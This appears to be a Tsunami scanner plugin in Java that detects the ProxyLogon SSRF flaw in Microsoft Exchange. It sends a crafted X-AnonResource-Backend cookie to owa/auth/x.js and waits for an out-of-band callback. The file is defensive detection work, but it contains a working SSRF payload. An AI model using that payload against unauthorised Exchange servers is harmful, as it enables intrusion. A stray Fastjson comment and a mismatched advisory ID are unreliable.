/*
 * Copyright 2026 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 * http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

package com.google.tsunami.plugins.detectors.cves.cve202126855;

import static com.google.common.base.Preconditions.checkNotNull;
import static com.google.common.base.Verify.verify;
import static com.google.common.collect.ImmutableList.toImmutableList;
import static com.google.common.net.HttpHeaders.CONTENT_TYPE;
import static com.google.common.net.HttpHeaders.COOKIE;

import com.google.common.annotations.VisibleForTesting;
import com.google.common.collect.ImmutableList;
import com.google.common.flogger.GoogleLogger;
import com.google.common.util.concurrent.Uninterruptibles;
import com.google.protobuf.util.Timestamps;
import com.google.tsunami.common.data.NetworkServiceUtils;
import com.google.tsunami.common.net.http.HttpClient;
import com.google.tsunami.common.net.http.HttpHeaders;
import com.google.tsunami.common.net.http.HttpRequest;
import com.google.tsunami.common.net.http.HttpResponse;
import com.google.tsunami.common.net.http.HttpStatus;
import com.google.tsunami.common.time.UtcClock;
import com.google.tsunami.plugin.PluginType;
import com.google.tsunami.plugin.VulnDetector;
import com.google.tsunami.plugin.annotations.PluginInfo;
import com.google.tsunami.plugin.payload.NotImplementedException;
import com.google.tsunami.plugin.payload.Payload;
import com.google.tsunami.plugin.payload.PayloadGenerator;
import com.google.tsunami.proto.DetectionReport;
import com.google.tsunami.proto.DetectionReportList;
import com.google.tsunami.proto.DetectionStatus;
import com.google.tsunami.proto.NetworkService;
import com.google.tsunami.proto.PayloadGeneratorConfig;
import com.google.tsunami.proto.Severity;
import com.google.tsunami.proto.TargetInfo;
import com.google.tsunami.proto.Vulnerability;
import com.google.tsunami.proto.VulnerabilityId;
import java.io.IOException;
import java.time.Clock;
import java.time.Duration;
import java.time.Instant;
import java.util.Optional;
import javax.inject.Inject;

/** A Tsunami plugin that detects CVE-2021-26855, AKA ProxyLogon, in Microsoft Exchange Server. */
@PluginInfo(
    type = PluginType.VULN_DETECTION,
    name = "Microsoft Exchange ProxyLogon SSRF and RCE (CVE-2021-26855)",
    version = "0.1",
    description =
        "Due to mishandling of cookies and headers"
            + " in the Microsoft Exchange Server, Server-Side Request Forgery"
            + " and Remote Code Execution are possible (ProxyLogon).",
    author = "Robert Dick (robert@doyensec.com)",
    bootstrapModule = MicrosoftExchangeCve202126855BootstrapModule.class)
public final class MicrosoftExchangeCve202126855 implements VulnDetector {
  @VisibleForTesting static final String VULNERABILITY_REPORT_PUBLISHER = "TSUNAMI_COMMUNITY";
  @VisibleForTesting static final String VULNERABILITY_REPORT_ID = "CVE-2025-70974";

  @VisibleForTesting
  static final String VULNERABILITY_REPORT_TITLE =
      "Microsoft Exchange ProxyLogon SSRF" + " and RCE (CVE-2021-26855)";

  private static final String PAYLOAD_TEMPLATE = "tsunami]@HOST/#~1";

  static final String VULNERABILITY_REPORT_DESCRIPTION_BASIC =
      "The scanner detected a vulnerable instance of the Microsoft Exchange Server"
          + " (CVE-2021-26855). The vulnerability can be exploited by sending an unauthenticated"
          + " HTTP GET request containing a URL that points to a malicious HTTPS server. "
          + " This can easily lead to Remote Code Execution.";

  @VisibleForTesting
  static final String VULNERABILITY_REPORT_DESCRIPTION_CALLBACK =
      VULNERABILITY_REPORT_DESCRIPTION_BASIC
          + "The vulnerability was confirmed via an out of band callback.";

  @VisibleForTesting
  static final String VULNERABILITY_REPORT_RECOMMENDATION =
      "Update the Microsoft Exchange Server to the latest version.";

  // from the original blog post at
  // https://blog.orange.tw/posts/2021-08-proxylogon-a-new-attack-surface-on-ms-exchange-part-1/
  @VisibleForTesting static final String EXPLOIT_ENDPOINT = "owa/auth/x.js";

  private static final GoogleLogger logger = GoogleLogger.forEnclosingClass();
  private final Clock utcClock;
  private final HttpClient httpClient;
  private final PayloadGenerator payloadGenerator;
  private final int oobSleepDuration;

  @Inject
  MicrosoftExchangeCve202126855(
      @UtcClock Clock utcClock,
      HttpClient httpClient,
      PayloadGenerator payloadGenerator,
      @Annotations.OobSleepDuration int oobSleepDuration) {
    this.utcClock = checkNotNull(utcClock);
    // we need to disable following redirections for this detector
    // because we need to use the redirection responses
    this.httpClient = checkNotNull(httpClient).modify().setFollowRedirects(false).build();
    this.payloadGenerator = checkNotNull(payloadGenerator);
    this.oobSleepDuration = oobSleepDuration;
  }

  @Override
  public ImmutableList<Vulnerability> getAdvisories() {
    return ImmutableList.of(
        Vulnerability.newBuilder()
            .setMainId(
                VulnerabilityId.newBuilder()
                    .setPublisher(VULNERABILITY_REPORT_PUBLISHER)
                    .setValue(VULNERABILITY_REPORT_ID))
            .addRelatedId(
                VulnerabilityId.newBuilder().setPublisher("CVE").setValue("CVE-2021-26855"))
            .setSeverity(Severity.CRITICAL)
            .setTitle(VULNERABILITY_REPORT_TITLE)
            .setDescription(VULNERABILITY_REPORT_DESCRIPTION_CALLBACK)
            .setRecommendation(VULNERABILITY_REPORT_RECOMMENDATION)
            .build());
  }

  // Since Fastjson is a simple JSON parser, we test by sending a POST request to
  // / with the JSON
  // body. There is no easy way to fingerprint Fastjson since errors might be
  // handled differently
  // depending on the web server.
  @Override
  public DetectionReportList detect(
      TargetInfo targetInfo, ImmutableList<NetworkService> matchedServices) {
    logger.atInfo().log(
        "Microsoft Exchange ProxyLogon SSRF and RCE (CVE-2021-26855) starts detecting.");

    return DetectionReportList.newBuilder()
        .addAllDetectionReports(
            matchedServices.stream()
                .filter(NetworkServiceUtils::isWebService)
                .filter(this::isExchange)
                .filter(this::isServiceVulnerable)
                .map(networkService -> buildDetectionReport(targetInfo, networkService))
                .collect(toImmutableList()))
        .build();
  }

  private boolean isExchange(NetworkService networkService) {
    String targetUri = NetworkServiceUtils.buildWebApplicationRootUrl(networkService);
    HttpRequest req = HttpRequest.get(targetUri).withEmptyHeaders().build();
    HttpResponse response;
    try {
      response = this.httpClient.send(req, networkService);
    } catch (IOException e) {
      logger.atInfo().log("Failed to send HTTP request: " + e.getMessage());
      return false;
    }
    Optional<String> location = response.headers().get("location");
    logger.atInfo().log("Location " + location);
    if (response.status().equals(HttpStatus.FOUND)
        && location.isPresent()
        && location.get().endsWith("/owa/")) {
      return true;
    } else {
      return false;
    }
  }

  private String getCookiePayload(String payload) {

    return "X-AnonResource=true; X-AnonResource-Backend=" + payload;
  }

  // Checks whether a given instance is vulnerable.
  private boolean isServiceVulnerable(NetworkService networkService) {

    // Generate the payload for the callback server
    PayloadGeneratorConfig config =
        PayloadGeneratorConfig.newBuilder()
            .setVulnerabilityType(PayloadGeneratorConfig.VulnerabilityType.SSRF)
            .setInterpretationEnvironment(
                PayloadGeneratorConfig.InterpretationEnvironment.INTERPRETATION_ANY)
            .setExecutionEnvironment(PayloadGeneratorConfig.ExecutionEnvironment.EXEC_ANY)
            .build();

    String oobCallbackUrl = "";
    Payload payload = null;

    // Check if the callback server is available, fallback to response matching if
    // not
    try {
      payload = this.payloadGenerator.generate(config);
      // Use callback for RCE confirmation and raise severity on success
      if (payload == null || !payload.getPayloadAttributes().getUsesCallbackServer()) {
        logger.atWarning().log("Tsunami Callback Server not available");
        return false;
      } else {
        oobCallbackUrl = payload.getPayload();
      }
    } catch (NotImplementedException e) {
      return false;
    }

    String ssrfPayload = PAYLOAD_TEMPLATE.replace("HOST", oobCallbackUrl);

    // Send the malicious HTTP request
    String targetUri =
        NetworkServiceUtils.buildWebApplicationRootUrl(networkService) + EXPLOIT_ENDPOINT;
    logger.atInfo().log("Sending payload to '%s'", targetUri);
    HttpRequest req =
        HttpRequest.get(targetUri)
            .setHeaders(
                HttpHeaders.builder()
                    .addHeader(CONTENT_TYPE, "application/json")
                    .addHeader(COOKIE, getCookiePayload(ssrfPayload))
                    .build())
            .build();

    try {
      this.httpClient.send(req, networkService);
    } catch (IOException e) {
      logger.atWarning().withCause(e).log("Failed to send payload to '%s'", targetUri);
    }
    // payload should never be null here as we should have already returned in that
    // case
    verify(payload != null);
    logger.atInfo().log("Waiting for callback.");
    Uninterruptibles.sleepUninterruptibly(Duration.ofSeconds(oobSleepDuration));
    if (payload.checkIfExecuted()) {
      logger.atInfo().log("Vulnerability confirmed via Callback Server.");
      return true;
    } else {
      logger.atInfo().log(
          "Callback not received and response does not match vulnerable instance, instance is not"
              + " vulnerable.");
      return false;
    }
  }

  private DetectionReport buildDetectionReport(
      TargetInfo targetInfo, NetworkService vulnerableNetworkService) {

    return DetectionReport.newBuilder()
        .setTargetInfo(targetInfo)
        .setNetworkService(vulnerableNetworkService)
        .setDetectionTimestamp(Timestamps.fromMillis(Instant.now(utcClock).toEpochMilli()))
        .setDetectionStatus(DetectionStatus.VULNERABILITY_VERIFIED)
        .setVulnerability(this.getAdvisories().get(0))
        .build();
  }
}
